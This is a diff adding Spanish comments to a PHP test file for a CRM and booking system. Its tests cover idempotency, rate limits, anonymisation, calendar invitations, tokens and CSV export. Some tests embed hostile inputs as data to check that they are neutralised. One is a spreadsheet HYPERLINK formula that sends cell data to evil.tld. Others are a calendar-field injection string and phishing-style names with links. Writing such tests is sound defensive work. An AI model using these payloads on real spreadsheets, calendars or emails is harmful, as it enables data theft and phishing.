+    // entrada_web_guardar() (crm.php): la clave (token_id, idempotencia) es única; el
+    // segundo intento devuelve 0 y deja la fila previa en $previa.
     // ---- Idempotencia ----
     $previa = null;
     $id1 = entrada_web_guardar($fila(), $previa);
@@ -891,6 +1040,8 @@ if (!extension_loaded('pdo_sqlite') || function_exists('q')) {
        [entrada_web_guardar($fila(['token_id' => null, 'idempotencia' => null])) > 0,
         entrada_web_guardar($fila(['token_id' => null, 'idempotencia' => null])) > 0], [true, true]);
 
+    // entrada_web_retomar(): una entrada en «error» se retoma con el pedido
+    // nuevo, y sólo una vez (el UPDATE condicional hace de candado).
     // Horario tomado: la web vuelve a mandar con la MISMA clave y otro horario.
     $idE = entrada_web_guardar($fila(['idempotencia' => 'web-prueba-0000000002']));
     entrada_web_actualizar($idE, ['estado' => 'error', 'error' => 'horario_tomado:inicio']);
@@ -901,6 +1052,8 @@ if (!extension_loaded('pdo_sqlite') || function_exists('q')) {
        ['procesando', null, $hNuevo, date('Y-m-d H:i:s', 1793710800)]);
     ok('y dos reintentos simultáneos no la retoman los dos', !entrada_web_retomar($idE, $fila()));
 
+    // entrada_web_duplicada(): misma persona, servicio y mensaje en los últimos
+    // 30 minutos, entre consultas terminadas «ok».
     // ---- Consultas duplicadas ----
     $con = static fn(string $idem, array $extra = []): array => $fila($extra + [
         'idempotencia' => $idem, 'tipo' => 'consulta', 'tipo_reunion_id' => null, 'inicio_pedido' => null,
@@ -922,6 +1075,9 @@ if (!extension_loaded('pdo_sqlite') || function_exists('q')) {
     entrada_web_actualizar($idR, ['estado' => 'ok']);
     eq('una reserva no hace duplicada a una consulta', entrada_web_duplicada($d, 1, 'web-consulta-000000005'), 0);
 
+    // limite_superado() / limite_espera() (crm.php): ventanas fijas por clave
+    // en api_limites. La purga de vencidos es probabilística, por eso el bucle
+    // insiste hasta 1000 veces.
     // ---- Límite de envíos ----
     $r = [];
     for ($i = 0; $i < 4; $i++) { $r[] = limite_superado('ip:prueba:reserva:3600', 3, 3600); }
@@ -936,6 +1092,8 @@ if (!extension_loaded('pdo_sqlite') || function_exists('q')) {
     }
     ok('los contadores vencidos se purgan solos de vez en cuando', !qv("SELECT COUNT(*) FROM api_limites WHERE clave = 'viejo'"));
 
+    // entradas_web_anonimizar(): pasados N días se borran los datos personales
+    // de las entradas que no llegaron a ser contacto.
     // ---- Anonimización (Ley 25.326) ----
     $idViejo = entrada_web_guardar($con('web-consulta-000000010'));
     $idConContacto = entrada_web_guardar($con('web-consulta-000000011'));
@@ -948,6 +1106,8 @@ if (!extension_loaded('pdo_sqlite') || function_exists('q')) {
     eq('pero conserva el canal y la página', [$v['canal'], $v['origen_pagina']], ['Google Ads', '/diagnostico/']);
     eq('la que tiene contacto queda igual', qv('SELECT nombre FROM entradas_web WHERE id = ?', [$idConContacto]), 'Juana Prueba');
 
+    // agenda_ics(): UID estable (el de Google si existe), SEQUENCE creciente y
+    // la cancelación sobre la misma invitación.
     // ---- Invitación: un solo identificador para toda la vida de la reunión ----
     $res = ['id' => 7, 'token' => str_repeat('a', 32), 'inicia_el' => '2026-11-03 09:30:00', 'termina_el' => '2026-11-03 10:00:00',
             'invitado_nombre' => 'Juana Prueba', 'invitado_email' => 'bsierra@intellihelp.tech', 'meet_url' => '',
@@ -964,6 +1124,8 @@ if (!extension_loaded('pdo_sqlite') || function_exists('q')) {
     contiene('con la secuencia siguiente', $icsBaja, "\r\nSEQUENCE:3\r\n");
     no_contiene('y sin enlace para mover lo que ya no existe', $icsBaja, 'r/mover');
 
+    // Inyección en el .ics: el nombre va entre comillas y el comentario del
+    // visitante no entra a la invitación.
     // ---- Invitación: lo que escribió el visitante no entra al formato ----
     $icsRaro = str_replace("\r\n ", '', agenda_ics(['invitado_nombre' => 'Pérez, Juan: mailto:otro@evil.tld',
         'comentario' => "Hola\rLOCATION:https://evil.tld\r\nATTENDEE:mailto:x@evil.tld"] + $res, $tipoIcs));
@@ -973,16 +1135,23 @@ if (!extension_loaded('pdo_sqlite') || function_exists('q')) {
        count(array_filter(explode("\r\n", $icsRaro), fn($l) => str_starts_with($l, 'LOCATION:'))), 1);
     eq('ni un retorno suelto adentro', substr_count($icsRaro, "\r"), substr_count($icsRaro, "\r\n"));
 
+    // Con $unaVez = true el token queda anotado y no sirve una segunda vez
+    // (necesita base, por eso está acá y no arriba).
     // ---- Token de formulario: una sola vez ----
     $tUnico = $tokenCon(7, time() - 10, 'reservar', bin2hex(random_bytes(8)));
     ok('token nuevo: sirve la primera vez', agenda_form_token_valido($tUnico, 7, $m, 'reservar', true));
     ok('la segunda vez no', !agenda_form_token_valido($tUnico, 7, $m, 'reservar', true) && $m === 'usado');
 
+    // api_firma_usada(): una firma de escritura no se acepta dos veces (replay).
     // ---- Firma de una escritura: una sola vez ----
     $firmaX = hash('sha256', random_bytes(16));
     ok('una firma nueva no figura como usada', !api_firma_usada($firmaX));
     ok('la misma firma repetida sí', api_firma_usada($firmaX));
 
+    // Feriados de punta a punta contra la base en memoria: sincronización con
+    // fuente simulada, agenda sin turnos, reservas rechazadas, avisos y
+    // jurisdicciones. Las tablas se crean acá con sólo las columnas que usan
+    // feriados.php y agenda.php.
     // ---- Feriados contra la base ----
     echo "== Feriados: sincronización, agenda y reservas ==\n";
     db()->exec("CREATE TABLE feriados (id INTEGER PRIMARY KEY AUTOINCREMENT, fecha TEXT NOT NULL, nombre TEXT NOT NULL,
@@ -995,6 +1164,8 @@ if (!extension_loaded('pdo_sqlite') || function_exists('q')) {
     db()->exec("CREATE TABLE IF NOT EXISTS agenda_horarios (id INTEGER PRIMARY KEY AUTOINCREMENT, tipo_id INTEGER, dia INTEGER, desde TEXT, hasta TEXT)");
     db()->exec("CREATE TABLE IF NOT EXISTS agenda_reservas (id INTEGER PRIMARY KEY AUTOINCREMENT, tipo_id INTEGER, usuario_id INTEGER, inicia_el TEXT,
                     termina_el TEXT, estado TEXT, invitado_nombre TEXT, invitado_empresa TEXT, invitado_email TEXT)");
+    // notificar() de notificaciones.php se reemplaza: los avisos quedan en
+    // $GLOBALS['__avisos'] para poder inspeccionarlos.
     if (!function_exists('notificar')) {
         function notificar(string $tipo, string $titulo, array $d = []): void { $GLOBALS['__avisos'][] = $d + ['titulo' => $titulo]; }
     }
@@ -1003,6 +1174,9 @@ if (!extension_loaded('pdo_sqlite') || function_exists('q')) {
     // Un año que viene, para que las reservas de prueba siempre estén en el futuro.
     $A  = (int)date('Y') + 1;
     $A2 = $A + 1;
+    // Fuentes simuladas: $caida devuelve null (fuente sin respuesta) y
+    // $fuenteDe([año => calendario|null]) usa el calendario de juguete para los
+    // años que no se le pasan.
     $caida = static fn(int $anio): ?array => null;
     $fuenteDe = static function (array $porAnio) use ($calendario): callable {
         return static function (int $anio) use ($porAnio, $calendario): ?array {
@@ -1110,6 +1284,9 @@ if (!extension_loaded('pdo_sqlite') || function_exists('q')) {
     unset($GLOBALS['__ajustes']['feriados_activo']);
 }
 
+// csv_celda() (helpers.php): una celda que empieza con = + - @ se antepone
+// con apóstrofo para que Excel no la ejecute, salvo teléfonos e importes.
+// Este bloque y los siguientes corren siempre, haya o no pdo_sqlite.
 // ---- Exportación CSV: nada que la planilla tome como fórmula ----
 eq('una fórmula queda como texto', csv_celda('=HYPERLINK("https://evil.tld/?d="&E2;"Ver")'),
    "'=HYPERLINK(\"https://evil.tld/?d=\"&E2;\"Ver\")");
@@ -1118,6 +1295,9 @@ eq('un teléfono con + queda igual', csv_celda('+54 11 5555-0000'), '+54 11 5555
 eq('un importe negativo también', csv_celda('-1500.50'), '-1500.50');
 eq('el texto común no se toca', csv_celda('Juana Prueba'), 'Juana Prueba');
 
+// ip_confiable(), ip_red(), ip_en_rango() (helpers.php): las cabeceras
+// X-Forwarded-For y Client-IP sólo cuentan detrás de un proxy declarado en
+// proxies_confiables. Este bloque modifica $_SERVER y la config global.
 // ---- IP del visitante: la que vio el servidor ----
 $_SERVER['REMOTE_ADDR'] = '203.0.113.7';
 $_SERVER['HTTP_X_FORWARDED_FOR'] = '1.2.3.4, 203.0.113.7';
@@ -1132,6 +1312,9 @@ eq('dos direcciones del mismo /64 dan lo mismo', ip_red('2001:db8:1:2::1'), ip_r
 eq('IPv4: la IP', ip_red('203.0.113.7'), '203.0.113.7');
 ok('rango CIDR v4', ip_en_rango('203.0.113.200', '203.0.113.0/24') && !ip_en_rango('203.0.114.1', '203.0.113.0/24'));
 
+// texto_sin_enlaces() y su uso en api_validar_entrada(): nombre y empresa
+// vuelven en el correo con la marca de la empresa, así que no pueden traer
+// direcciones web (phishing con la marca propia).
 // ---- Nombre y empresa sin direcciones web ----
 ok('un nombre con https:// no pasa', !texto_sin_enlaces('Juan, verificá en https://evil.tld/login'));
 ok('ni con www.', !texto_sin_enlaces('Ver www.evil.tld'));
@@ -1143,12 +1326,15 @@ ok('la API rechaza el nombre con enlace', isset($errLink['nombre']));
     'email' => 'bsierra@intellihelp.tech', 'telefono' => '', 'servicio' => '', 'mensaje' => '']], false);
 ok('y el nombre de más de 120 (no entra en la ficha del contacto)', isset($errLargo['nombre']));
 
+// Bloque de texto con 'sin_enlaces' => true: lo que escribió el visitante
+// no se convierte en enlace en el correo de confirmación.
 // ---- Correo de confirmación: sin enlaces de lo que escribió el visitante ----
 $htmlSin = bloques_render([['tipo' => 'texto', 'texto' => 'Hola https://evil.tld,', 'sin_enlaces' => true]], [], []);
 no_contiene('un texto marcado sin_enlaces no se enlaza', $htmlSin, 'href="https://evil.tld');
 $htmlCon = bloques_render([['tipo' => 'texto', 'texto' => 'Cambialo acá: https://intellihelp.tech/crm/r/mover']], [], []);
 contiene('el resto de los textos sigue enlazando', $htmlCon, 'href="https://intellihelp.tech/crm/r/mover"');
 
+// ---- Resumen y código de salida (0 = todo bien, 1 = alguna falla) ----
 echo "\n";
 echo str_repeat('=', 56) . "\n";
 printf("  %d pruebas · %d correctas · %d fallidas\n", $T, $T - $F, $F);
